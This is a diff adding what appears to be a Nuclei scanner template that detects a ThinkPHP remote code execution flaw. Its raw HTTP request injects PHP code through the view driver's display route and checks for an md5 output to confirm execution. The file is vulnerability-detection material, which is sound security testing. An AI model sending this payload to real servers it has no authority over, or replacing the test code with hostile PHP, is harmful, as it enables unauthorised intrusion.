@@ -1,0 +1,19 @@
+id: thinkphp-driver-display-rce
+info:
+  name: ThinkPHP Driver Display RCE
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+  description: |
+    This template detects the ThinkPHP Driver Display RCE vulnerability by checking if the server executes a PHP payload and returns the expected result.
+http:
+  - raw:
+      - |
+        GET /index.php?s=index/\think\view\driver\Php/display&content=<?php var_dump(md5(2333));?> HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "56540676a129760a"
+        part: body
